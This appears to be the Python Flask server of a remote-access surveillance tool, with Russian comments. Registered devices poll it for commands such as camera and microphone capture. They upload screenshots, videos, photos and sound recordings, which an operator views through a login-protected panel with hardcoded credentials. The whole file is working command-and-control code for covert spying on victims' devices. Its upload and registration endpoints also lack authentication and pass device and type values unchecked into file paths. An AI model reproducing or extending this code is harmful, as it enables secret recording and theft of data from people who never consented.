from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory, jsonify
import os
import threading
import time

app = Flask(__name__)
app.secret_key = 'some_secret_key'  # Секретный ключ для сессий

# Учетные данные для входа
USERNAME = 'MassoniAdmin'
PASSWORD = 'DenMason'

# Директория для хранения данных
STORAGE_DIR = 'storage'
if not os.path.exists(STORAGE_DIR):
    os.makedirs(STORAGE_DIR)

# Словарь устройств: {device_id: {'command': команда, 'params': параметры, 'ongoing': флаг}}
devices = {}
devices_lock = threading.Lock()

# Страница входа
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            return 'Неверные учетные данные'
    return render_template('login.html')

# Панель управления
@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    if request.method == 'POST':
        # Отправка команды
        device_id = request.form['device_id']
        command = request.form['command']
        params = request.form.get('params', '')
        with devices_lock:
            if device_id in devices:
                devices[device_id]['command'] = command
                devices[device_id]['params'] = params
                # Для команд camera и microphone устанавливаем флаг ongoing
                if command in ['camera', 'microphone']:
                    devices[device_id]['ongoing'] = True
                else:
                    devices[device_id]['ongoing'] = False
    with devices_lock:
        device_list = list(devices.keys())
    return render_template('dashboard.html', devices=device_list)

# Хранилище данных
@app.route('/storage')
def storage():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    device_folders = [d for d in os.listdir(STORAGE_DIR) if os.path.isdir(os.path.join(STORAGE_DIR, d))]
    return render_template('storage.html', devices=device_folders)

# Просмотр определенного типа данных
@app.route('/storage/<device_id>/<type>')
def storage_type(device_id, type):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    type_dir = os.path.join(STORAGE_DIR, device_id, type)
    if not os.path.exists(type_dir):
        return 'Нет данных'
    files = os.listdir(type_dir)
    return render_template('storage_type.html', device_id=device_id, type=type, files=files)

# Отправка файлов клиенту
@app.route('/storage/<device_id>/<type>/<filename>')
def serve_file(device_id, type, filename):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return send_from_directory(os.path.join(STORAGE_DIR, device_id, type), filename)

# Регистрация устройства
@app.route('/register', methods=['POST'])
def register():
    device_id = request.json['device_id']
    with devices_lock:
        if device_id not in devices:
            devices[device_id] = {'command': None, 'params': None, 'ongoing': False}
            # Создание директорий для хранения
            os.makedirs(os.path.join(STORAGE_DIR, device_id, 'screenshots'), exist_ok=True)
            os.makedirs(os.path.join(STORAGE_DIR, device_id, 'videos'), exist_ok=True)
            os.makedirs(os.path.join(STORAGE_DIR, device_id, 'photos'), exist_ok=True)
            os.makedirs(os.path.join(STORAGE_DIR, device_id, 'sounds'), exist_ok=True)
            os.makedirs(os.path.join(STORAGE_DIR, device_id, 'camera'), exist_ok=True)
            os.makedirs(os.path.join(STORAGE_DIR, device_id, 'microphone'), exist_ok=True)
    return 'Registered'

# Получение команды для устройства
@app.route('/get_command/<device_id>')
def get_command(device_id):
    with devices_lock:
        if device_id in devices:
            command = devices[device_id]['command']
            params = devices[device_id]['params']
            ongoing = devices[device_id]['ongoing']
            # Очищаем команду, если она не длительная
            if not ongoing:
                devices[device_id]['command'] = None
                devices[device_id]['params'] = None
            return jsonify({'command': command, 'params': params})
    return jsonify({'command': None})

# Загрузка файлов от устройства
@app.route('/upload/<device_id>', methods=['POST'])
def upload(device_id):
    file = request.files['file']
    type = request.form['type']
    timestamp = time.strftime('%Y%m%d-%H%M%S')
    filename = f'{type}_{timestamp}.{file.filename.split(".")[-1]}'
    save_path = os.path.join(STORAGE_DIR, device_id, type, filename)
    file.save(save_path)
    return 'Uploaded'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)